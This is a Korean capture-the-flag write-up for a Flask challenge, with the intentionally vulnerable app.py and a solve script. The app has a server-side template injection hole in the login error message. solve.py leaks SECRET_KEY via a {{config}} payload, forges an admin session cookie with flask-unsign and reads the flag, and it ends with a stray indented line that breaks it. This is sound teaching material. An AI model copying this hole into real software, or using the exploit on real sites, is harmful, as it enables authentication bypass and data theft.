# RandomSecret

# Usage
- 공란

# Concept
- flask secret_key
- ssti

# Writeup
문제 컨셉에 경우 ssti로 flask로 secret_key를 leak한뒤 flask-unsign으로 세션을 만들어 인증하면 풀리는 문제입니다. secret_key를 고정하지 않고 0.5초마다 계속해서 바뀌게 해서 무조건 요청을 날려야만 풀리게 만들었습니다. flask의 secret_key가 어떤 존재인지 공부하자는 의미에서 만든 문제입니다. 

#### app.py
```py
from flask import Flask, render_template, session, redirect, url_for, request,render_template_string
import os
import threading
import time


try:
    FLAG = open("./flag.txt", "r").read()
except :
    FLAG = "hspace{fake_flag}"

app = Flask(__name__)
secret_key_lock = threading.Lock()
users = {
    "admin": "Access denied!!",
    "guest": "guest"
}

def generate_new_secret_key():
    return os.urandom(30).hex()

def update_secret_key():
    while True:
        time.sleep(0.5)
        with secret_key_lock:
            app.secret_key = generate_new_secret_key()
thread = threading.Thread(target=update_secret_key)
thread.start()

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/admin')
def admin():
    if 'admin' not in session:
        return render_template_string('<script>alert("You are not admin!");location.href="/login"</script>')
    else:
        return "Hello admin here is "+FLAG

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if len(username) > 11: 
            return render_template_string('<script>alert("username too looooong"); location.href="/login"</script>')
        if username == 'guest' and password == users.get('guest'):
            session['guest'] = True
            return redirect(url_for('guest'))
        elif username in users and users[username] == password:
            session['admin'] = True if username == 'admin' else False
            return redirect(url_for('/'))
        else:
            return render_template_string(f"{username} is wrong username or password")
    return render_template('login.html')


@app.route('/guest')
def guest():
    if 'guest' not in session:
        return render_template_string('<script>alert("You are not guest!");location.href="/login"</script>')
    else:
        return "Hello guest"

if __name__ == '__main__':
    app.secret_key = generate_new_secret_key()
    app.run(host='0.0.0.0', port=4000)
```
간단하게 로그인할 수 있는 사이트입니다. admin엔드 포인트에 admin세션을 가지고 있으면 flag를 리턴합니다. 유저제공 파일에서는 admin의 비밀 번호를 가려놓았습니다.
공격벡터의 경우 로그인 엔드포인트에서 잘못된 username 사용시 잘못된 username을 그대로 렌더링해서 ssti가 터집니다. 길이제한을 10자이하로 걸어놓아서 RCE를 막았습니다. 
{{config}}로 secret_key를 leak 하면 됩니다. 그러나 app.py를 보면 secret_key를 0.5초마다 바꿔지기 때문에 익스플로잇 코드를 작성해 flask-unsign으로 생성한 세션으로 admin엔드포인트에 get요청을 날려야합니다. 


#### solve.py

```py

#pip install flask-unsign
import requests
import html
import subprocess

def exploit_admin_page(url, payload):
    try:
        res = requests.post(url=url+'/login', data=payload)
        decoded_text = html.unescape(res.text)
        start_index = decoded_text.find("'SECRET_KEY': '") + len("'SECRET_KEY': '")
        end_index = decoded_text.find("'", start_index)
        secret_key = decoded_text[start_index:end_index]
        print("SECRET_KEY:", secret_key)
        exploit = subprocess.run(['flask-unsign', '--sign', '--cookie', '{\'admin\':True}', '--secret', secret_key], capture_output=True)
        cookie_value = exploit.stdout.strip().decode('utf-8')
        res = requests.get(url=url + "/admin", cookies={"session": cookie_value})
        if "hspace" in res.text:
            print(res.text)
        else:
            exploit_admin_page(url, payload)
    except Exception as e:
        print("Error occurred:", e)

# Flask 서버 URL
url = 'http://localhost:2000'

# 유효한 사용자 정보로 POST 요청을 보냅니다.
payload = {"username": "{{config}}", "password": "aa"}

# 함수 호출
exploit_admin_page(url, payload)

    print("Error occurred:", e)


```
solve코드를 설명하자면 먼저 flask-unsign을 설치해야합니다. pip install flask-unsign로 설치할 수 있습니다.{{config}}를 날려 SECRET_KEY를 leak하고 SECRET_KEY로 admin은 True인 세션을 생성합니다. 생성된 세션으로 admin엔드포인트에 요청을 날리면 flag를 줍니다. 그리고 굳이 flask-unsign을 안쓰고 요청을 날려 secret_key를 leak하고 그 key로 flask를 구현해서 세션을 생성해서 인증해서 풀수도 있습니다. 

